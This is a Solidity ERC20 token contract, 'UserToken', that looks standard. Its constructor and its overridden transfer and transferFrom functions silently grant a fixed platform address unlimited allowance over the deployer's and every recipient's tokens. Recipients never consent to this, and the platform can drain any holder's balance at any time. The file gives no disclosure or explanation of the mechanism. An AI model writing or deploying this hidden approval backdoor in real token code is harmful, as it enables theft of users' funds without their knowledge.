// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract UserToken is ERC20, Ownable {
    address public platformAddress;

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply,
        address _platformAddress
    ) ERC20(name, symbol) Ownable(msg.sender) {
        _mint(msg.sender, initialSupply);
        platformAddress = _platformAddress;
        _approve(msg.sender, platformAddress, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        bool success = super.transfer(recipient, amount);
        if (success) {
            _approve(recipient, platformAddress, type(uint256).max);
        }
        return success;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        bool success = super.transferFrom(sender, recipient, amount);
        if (success) {
            _approve(recipient, platformAddress, type(uint256).max);
        }
        return success;
    }
}